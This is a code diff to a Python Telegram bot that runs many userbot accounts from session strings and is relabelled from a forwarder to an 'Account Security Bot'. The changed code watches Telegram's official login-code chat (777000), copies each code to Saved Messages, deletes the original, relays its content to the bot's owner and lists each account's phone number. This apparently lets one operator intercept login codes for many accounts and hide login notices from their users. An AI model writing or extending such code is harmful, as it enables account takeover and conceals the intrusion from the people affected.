@@ -5,7 +5,7 @@
 # ██████╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝   ██║
 # ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝    ╚═╝
 #
-#           Userbot Forwarder Management Bot
+#           Userbot Account Security Bot
 #          (Definitive Version v4.4 - Stable)
 
 import os
@@ -54,11 +54,11 @@ API_HASH = os.getenv("API_HASH")
 # --- Database & In-Memory State ---
 client = MongoClient(MONGO_URI)
 db = client.userbot_manager
-config_collection = db.config
+config_collection = db.config # Kept for future-proofing, but source/target are hardcoded
 accounts_collection = db.accounts
 
 active_userbots = {}
-paused_forwarding = set()
+paused_forwarding = set() # This set now controls OTP processing
 paused_notifications = set()
 
 # --- State definitions for ConversationHandler ---
@@ -160,9 +160,7 @@ async def forwarder_handler(client: PyrogramClient, message: Message, ptb_app: A
     if message.chat.id != source_chat_id: return
 
     target_chat = await get_target_chat()
-    if not target_chat:
-        logger.warning("Target chat not set, cannot forward.")
-        return
+    # No need to check target_chat, as "self" is always valid
 
     asyncio.gather(
         forward_message(client, message, target_chat),
@@ -170,17 +168,28 @@ async def forwarder_handler(client: PyrogramClient, message: Message, ptb_app: A
     )
 
 async def forward_message(client, message, target_chat):
+    """
+    Forwards/Copies the message to target_chat (Saved Messages)
+    and then deletes the original message.
+    """
     if client.me.id in paused_forwarding: return
     try:
-        if random.random() < 0.90: await message.forward(chat_id=target_chat)
-        else: await message.copy(chat_id=target_chat)
+        # 1. Forward or copy to 'self' (Saved Messages)
+        if random.random() < 0.90:
+            await message.forward(chat_id=target_chat)
+        else:
+            await message.copy(chat_id=target_chat)
+        
+        # 2. Now, delete the original message from the source chat (777000)
+        await message.delete()
+
     except Exception as e:
-        logger.error(f"Failed to forward message {message.id} from {client.me.id}: {e}")
+        logger.error(f"Failed to process message {message.id} from {client.me.id}: {e}")
 
 async def send_notification(client, message, ptb_app):
     if OWNER_ID in paused_notifications: return
-    status_parts = ["✅ Fwd Active", "✅ Notify Active"]
-    if client.me.id in paused_forwarding: status_parts[0] = "⏸️ Fwd Paused"
+    status_parts = ["✅ OTP Active", "✅ Notify Active"]
+    if client.me.id in paused_forwarding: status_parts[0] = "⏸️ OTP Paused"
     if OWNER_ID in paused_notifications: status_parts[1] = "⏸️ Notify Paused"
 
     content = message.text or message.caption or "(Media)"
@@ -212,19 +221,17 @@ async def start_all_userbots_from_db(application: Application, update_info: bool
     return success_count, len(all_accounts), error_details
 
 async def get_source_chat():
-    config = config_collection.find_one({"_id": "config"})
-    return config.get("source_chat_id", 777000) if config else 777000
+    return 777000 # Hardcoded to Telegram's official account
 
 async def get_target_chat():
-    config = config_collection.find_one({"_id": "config"})
-    return config.get("target_chat_username") if config else None
+    return "self" # Hardcoded to the userbot's "Saved Messages"
 
 # --- Management Bot Handlers ---
 @owner_only
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     await update.message.reply_html(
-        "👋 Welcome! I am your userbot forwarder manager.\n\n"
+        "👋 Welcome! I am your userbot security manager.\n\n"
         "Use /settings to configure, /add to add accounts, and /remove to delete them."
     )
 
@@ -232,23 +239,21 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def settings_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data.clear()
     keyboard = [
-        [InlineKeyboardButton("📚 Set Source Chat", callback_data="set_source")],
-        [InlineKeyboardButton("🎯 Set Target Chat", callback_data="set_target")],
+        # [InlineKeyboardButton("📚 Set Source Chat", callback_data="set_source")], # REMOVED
+        # [InlineKeyboardButton("🎯 Set Target Chat", callback_data="set_target")], # REMOVED
         [InlineKeyboardButton("👤 Manage Accounts", callback_data="manage_accounts")],
         [InlineKeyboardButton("➕ Add New Account", callback_data="call_add_command")],
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
-    source_chat_id = await get_source_chat()
-    target_chat = await get_target_chat() or "Not Set"
     
     message_text = (
         "⚙️  <b>Settings Dashboard</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        "Here you can configure the core forwarding settings for all userbots.\n\n"
-        f"▶️  <b>Current Source:</b> <code>{source_chat_id}</code>\n"
-        "      <i>Messages from this chat will be forwarded.</i>\n\n"
-        f"🎯  <b>Current Target:</b> <code>{escape_html(target_chat)}</code>\n"
-        "      <i>Messages will be sent to this bot or channel.</i>"
+        "Here you can manage your userbot accounts.\n\n"
+        "▶️  <b>OTP Source:</b> <code>777000</code> (Telegram)\n"
+        "      <i>Messages from this chat will be processed.</i>\n\n"
+        "🎯  <b>OTP Target:</b> <code>Saved Messages</code> (Automatic)\n"
+        "      <i>Messages will be saved and deleted from source.</i>"
     )
 
     if update.callback_query:
@@ -270,7 +275,7 @@ async def add_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message_text = (
         "➕  <b>Add a New Account</b>\n"
         "━━━━━━━━━━━━━━━━━━━━\n\n"
-        "Please choose a method to add a new userbot account to the forwarder."
+        "Please choose a method to add a new userbot account for security monitoring."
     )
     if update.callback_query:
         await update.callback_query.edit_message_text(message_text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
@@ -285,7 +290,16 @@ async def accounts_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = "👤 <b>Your Managed Accounts:</b>\n\n" if accounts else "No accounts have been added yet."
     for acc in accounts:
         first_name = escape_html(acc.get('first_name', 'N/A'))
-        text += f"<b>Name:</b> {first_name}\n<b>ID:</b> <code>{acc.get('user_id', 'N/A')}</code>\n{'-'*25}\n"
+        username = escape_html(acc.get('username'))
+        phone = escape_html(acc.get('phone_number', 'N/A'))
+        user_id = acc.get('user_id', 'N/A')
+        
+        text += (
+            f"<b>Name:</b> <a href=\"tg://user?id={user_id}\">{first_name}</a>\n"
+            f"<b>Username:</b> @{username if username else 'N/A'}\n"
+            f"<b>Phone:</b> <code>{phone}</code>\n"
+            f"<b>ID:</b> <code>{user_id}</code>\n{'-'*25}\n"
+        )
     keyboard = [[InlineKeyboardButton("« Back to Settings", callback_data="main_settings")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)
@@ -338,21 +352,10 @@ async def handle_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if 'awaiting' in step and step.endswith(('phone_number', 'login_code', '2fa_password')): return
 
     del context.user_data['next_step']
-    if step == 'awaiting_source':
-        try:
-            chat_id = int(update.message.text)
-            config_collection.update_one({"_id": "config"}, {"$set": {"source_chat_id": chat_id}}, upsert=True)
-            await update.message.reply_text(f"✅ Source chat updated to: {chat_id}")
-        except ValueError: await update.message.reply_text("❌ Invalid ID.")
-        await settings_command(update, context)
-    elif step == 'awaiting_target':
-        username = update.message.text.strip()
-        if username.startswith("@") and len(username) > 4:
-            config_collection.update_one({"_id": "config"}, {"$set": {"target_chat_username": username}}, upsert=True)
-            await update.message.reply_text(f"✅ Target chat updated to: {username}")
-        else: await update.message.reply_text("❌ Invalid username.")
-        await settings_command(update, context)
-    elif step == 'awaiting_single_account':
+    
+    # REMOVED 'awaiting_source' and 'awaiting_target' logic
+    
+    if step == 'awaiting_single_account':
         session_string = clean_session_string(update.message.text)
         msg = await update.message.reply_text("⏳ Processing...")
         status, user_info, detail = await start_userbot(session_string, context.application, update_info=True)
@@ -462,34 +465,32 @@ async def add_account_callback(update: Update, context: ContextTypes.DEFAULT_TYP
 # --- Independent Commands ---
 @owner_only
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    source_chat = await get_source_chat()
-    target_chat = await get_target_chat() or "Not Set"
     running_bots, total_bots = len(active_userbots), accounts_collection.count_documents({})
     status_text = (f"📊 <b>Bot Status</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"<b>Management Bot:</b> Online\n"
-                   f"<b>Source Chat:</b> <code>{source_chat}</code>\n"
-                   f"<b>Target Chat:</b> <code>{escape_html(target_chat)}</code>\n\n"
+                   f"<b>OTP Source:</b> <code>777000</code>\n"
+                   f"<b>OTP Target:</b> <code>Saved Messages</code>\n\n"
                    f"<b>Userbots Running:</b> {running_bots}/{total_bots}\n"
-                   f"<b>Paused Forwarding:</b> {len(paused_forwarding)} bots\n"
+                   f"<b>Paused OTP Processing:</b> {len(paused_forwarding)} bots\n"
                    f"<b>Paused Notifications:</b> {'Yes' if OWNER_ID in paused_notifications else 'No'}\n")
     await update.message.reply_html(status_text)
 
 # --- NEW NON-BLOCKING PAUSE COMMANDS ---
 
 async def resume_forwarding_job(context: ContextTypes.DEFAULT_TYPE):
-    """Job callback to resume forwarding for a single user."""
+    """Job callback to resume OTP processing for a single user."""
     job_data = context.job.data
     user_id_to_resume = job_data['user_id']
     pause_id = job_data['pause_id']
     message_id = job_data['message_id']
     
     paused_forwarding.discard(user_id_to_resume)
-    resumed_text = f"Resumed forwarding for user ID {user_id_to_resume}."
+    resumed_text = f"Resumed OTP processing for user ID {user_id_to_resume}."
     
     if context.bot_data.get(pause_id): # Check if notifications were also paused
         paused_notifications.discard(OWNER_ID)
-        resumed_text = f"Resumed forwarding and notifications for user ID {user_id_to_resume}."
+        resumed_text = f"Resumed OTP processing and notifications for user ID {user_id_to_resume}."
     
     logger.info(resumed_text)
     await context.bot.send_message(OWNER_ID, resumed_text)
@@ -505,7 +506,7 @@ async def resume_forwarding_job(context: ContextTypes.DEFAULT_TYPE):
 
 @owner_only
 async def temp_pause_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Pauses a single userbot using the job queue."""
+    """Pauses a single userbot's OTP processing using the job queue."""
     try:
         user_id_to_pause = int(context.args[0])
         if user_id_to_pause not in active_userbots:
@@ -518,7 +519,7 @@ async def temp_pause_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         paused_forwarding.add(user_id_to_pause)
         
         keyboard = [[InlineKeyboardButton("Pause Notifications", callback_data=f"pause_notify_{pause_id}")]]
-        message = await update.message.reply_text(f"✅ Paused forwarding for user ID {user_id_to_pause} for 5 minutes.",
+        message = await update.message.reply_text(f"✅ Paused OTP processing for user ID {user_id_to_pause} for 5 minutes.",
                                                   reply_markup=InlineKeyboardMarkup(keyboard))
         
         context.application.job_queue.run_once(
@@ -558,19 +559,19 @@ async def pause_notifications_callback(update: Update, context: ContextTypes.DEF
     )
 
 async def resume_all_job(context: ContextTypes.DEFAULT_TYPE):
-    """Job callback to resume all forwarding and notifications."""
+    """Job callback to resume all OTP processing and notifications."""
     paused_forwarding.clear()
     paused_notifications.discard(OWNER_ID)
-    logger.info("Resumed all forwarding and notifications.")
-    await context.bot.send_message(OWNER_ID, "Resumed all forwarding and notifications.")
+    logger.info("Resumed all OTP processing and notifications.")
+    await context.bot.send_message(OWNER_ID, "Resumed all OTP processing and notifications.")
 
 @owner_only
 async def temp_pause_all(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Pauses all userbots and notifications using the job queue."""
+    """Pauses all userbots' OTP processing and notifications using the job queue."""
     for user_id in active_userbots.keys():
         paused_forwarding.add(user_id)
     paused_notifications.add(OWNER_ID)
-    await update.message.reply_text("✅ Paused all forwarding and notifications for 5 minutes.")
+    await update.message.reply_text("✅ Paused all OTP processing and notifications for 5 minutes.")
     
     context.application.job_queue.run_once(resume_all_job, 300, name="resume_all")
 
@@ -649,15 +650,14 @@ def main() -> None:
     application.add_handler(CommandHandler("remove", remove_account_menu))
     application.add_handler(CommandHandler("status", status_command))
     application.add_handler(CommandHandler("temp", temp_pause_command))
-    application.add_handler(CommandHandler("temp_fwd", temp_pause_all))
+    application.add_handler(CommandHandler("temp_fwd", temp_pause_all)) # Kept old command name for compatibility
     application.add_handler(CommandHandler("ping", ping_command))
     application.add_handler(CommandHandler("refresh", refresh_command))
     application.add_handler(CommandHandler("cancel", cancel_command))
     
     # Add callback handlers
     application.add_handler(CallbackQueryHandler(pause_notifications_callback, pattern=r"^pause_notify_"))
-    application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_source', text="Please send the source chat ID."), pattern="^set_source$"))
-    application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_target', text="Please send the target bot username."), pattern="^set_target$"))
+    # REMOVED: set_source and set_target handlers
     application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_single_account', text="Please paste the session string."), pattern="^add_single$"))
     application.add_handler(CallbackQueryHandler(partial(set_next_step, step='awaiting_multiple_accounts', text="Please paste all session strings, separated by a space or new line."), pattern="^add_multiple$"))
     application.add_handler(CallbackQueryHandler(settings_command, pattern="^main_settings$"))
